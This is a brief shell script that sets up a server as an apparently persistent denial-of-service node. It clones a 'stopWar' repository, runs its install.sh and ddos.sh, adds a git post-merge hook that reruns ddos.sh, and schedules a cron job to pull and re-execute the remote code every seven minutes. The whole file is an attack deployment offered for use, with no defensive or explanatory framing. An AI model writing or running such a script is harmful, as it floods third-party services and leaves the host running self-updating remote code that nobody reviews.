#!/bin/sh

set -e

apt-get update
apt-get upgrade -y

cd /root && /usr/bin/git clone https://github.com/angelloGit/stopWar
cd /root/stopWar

./install.sh
./ddos.sh

cat > .git/hooks/post-merge <<__EOFF
#!/bin/sh

./ddos.sh > last.log
__EOFF

chmod a+x .git/hooks/post-merge

crontab - <<__EOFF
*/7 * * * * cd /root/stopWar/ && /usr/bin/git pull
__EOFF
